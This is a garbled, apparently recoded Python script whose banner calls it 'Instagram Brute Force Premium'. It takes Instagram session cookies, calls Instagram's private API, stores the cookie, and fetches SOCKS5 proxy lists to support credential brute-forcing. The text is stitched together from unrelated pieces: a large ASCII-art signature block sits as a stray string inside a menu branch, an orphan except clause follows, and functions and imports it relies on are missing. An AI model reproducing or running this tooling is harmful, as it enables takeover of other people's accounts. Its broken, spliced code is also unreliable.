# Tusbolled by Vternity ID

import requests,random,time,json,os,re,sys,uuid
from rich.console import Console
from rich.tree import Tree
from rich import print
from concurrent.futures import ThreadPoolExecutor
from platform import platform
from rich.panel import Panel
from requests.exceptions import ConnectionError
useragent=('Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; LENOVO/Lenovo; Lenovo A6020a40; A6020a40; qcom; ru_RU; 98288239)')
penampung=[]
def Banner():
    os.system('clear')
    try:
        with requests.Session()as r:
            response=r.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/Author.json')
            x=json.loads(response.text)
            author,version,status=x['Author'],x['Versi'],x['Status']
    except Exception as e:
        author,version,status=('Rozhak',0,'Error')
    Console(width=45,style='bold plum4').print(Panel(f"""
[bold red] ╔═╗┬─┐┌─┐┌┬┐┬┬ ┬┌┬┐[bold white] Author :[bold green] {author}
[bold red]╠═╝├┬┘├┤ │││││ ││││[bold white] Versi  : {version}
[bold white] ╩  ┴└─└─┘┴ ┴┴└─┘┴ ┴[bold white] Status :[bold yellow] {status}
[reverse blue]Instagram Brute Force Premium"""),justify='center')
def Login():
    Banner()
    Console(width=45,style='bold plum4').print(Panel('[bold green]1[bold white]. Login Menggunakan Cookies\n[bold green]2[bold white]. Cara Mendapatkan Cookie\n[bold green]3[bold white]. Keluar Dari Program',title='😎'))
    zhak=Console().input('[bold green]#[bold white] Choose : ')
    if zhak=='1' or zhak=='01':
        try:
            Console(width=45,style='bold plum4').print(Panel('[italic white]Silahkan Masukan Cookie Instagram, Pastikan Gunakan Akun[italic red] Tumbal[italic white] Untuk Login!',title='🙂'))
            cookie=Console().input('[bold green]#[bold white] Cookie : ')
            userid=re.search('ds_user_id=(\\d+);',str(cookie)).group(1)
            with requests.Session()as r:
                url=('https://i.instagram.com/api/v1/users/{}/info/'.format(userid))
                r.headers.update({
                    'Host':'i.instagram.com',
                    'cache-control':'max-age=0',
                    'sec-ch-ua-mobile':'?1',
                    'upgrade-insecure-requests':'1',
                    'user-agent':useragent,
                    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-mode':'navigate',
                    'sec-fetch-user':'?1',
                    'sec-fetch-dest':'document',
                    'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'cookie':cookie,
})
                response=r.get(url)
                x=json.loads(response.text)['user']
                name=x['full_name']
                username=x['username']
            open('Data/Cookie.json','w').write(json.dumps({'Cookie':cookie,'Username':username}))
            Console(width=45,style='bold plum4').print(Panel(f"[bold white]Welcome :[bold green] {name.title()}",title='👋'));Follow(f"{cookie};");time.sleep(2.5);Menu()
        except Exception as e:
            Console(width=45,style='bold plum4').print(Panel(f"[italic red]{str(e).title()}",title='😡'));sys.exit()
    elif zhak=='2' or zhak=='02':
        try:
            Console(width=45,style='bold plum4').print(Panel('[italic white]Sedang Membuka Youtube, Silahkan Ikuti Tutorial Di Menit Ke 7.0!',title='🙂'));time.sleep(2.5);subprocess.Popen(['xdg-open','https://www.youtube.com/watch?v=8c6hYAAJPKo&t=360s']);Console().input('[bold white][[bold green]Kembali[bold white]]');Login()
        except:sys.exit()
    elif zhak=='3' or zhak=='03':
"""
         [>] Tusbolled by Vternity [<]

                                   &
                                  BB&
          &##&                  &GGU
           &BPB#&##BBGGGGGGGGB##GP&
             BPPPPGBGB&&&&&&#BPPPPB&
            BGPPPB  &&        GPGGPPB&
          #PPB&BPG&          BPG& #GPPB
         BPG&   BPG         &PG&   &BPPG&
        #PG      GP#        GP&    & #PPG&
       &PP&      &PG       GP#     &  BPPG
       #PP&       #P#     BPB         #PPP&
       #PP#        GG    &PG          &PPP#
        GPG&       #P#   GP#          BPPP&
        &PPG&       GG  #PG          &GPP#
         &GPPB&     BPB&PP#         #PPP#
           #PPPB&   &PGBPG        #GPPG&
            &GGPPB&  GPPP#     &#GPPP#
             # #BPPGGPPPPGB#BBGPPPPG#
             &   &GGPPPPPPPPPPPGBB#&&
             &    # &BPPPB#&&B   &&
                      PG&    #   &&
                     &G#     #   &&
                       &
                       &

          [------------------------]
          [ Recode is'nt epic bro. ]
          [   Keep learn b*tch!    ]
          [------------------------]
          [    V t e r n i t y     ]
          [     t.me/vternity      ]
          [ vternity403@gmail.com  ]
          [------------------------]
"""
        response9=requests.get('http://ipinfo.io/json')
        country=json.loads(response9.text)['country']
        if str(country)=='ID':
            response=requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
            open('Data/Proxies.txt','w').write(str(response));os.system('git pull');Menu()
        else:
            Console(width=45,style='bold plum4').print(Panel(f"[italic red]Tools Ini Hanya Dapat Digunkan Di Indonesia!",title='😡'));sys.exit()
    except Exception as e:
        Console(width=45,style='bold plum4').print(Panel(f"[italic red]{str(e).title()}",title='😡'));sys.exit()
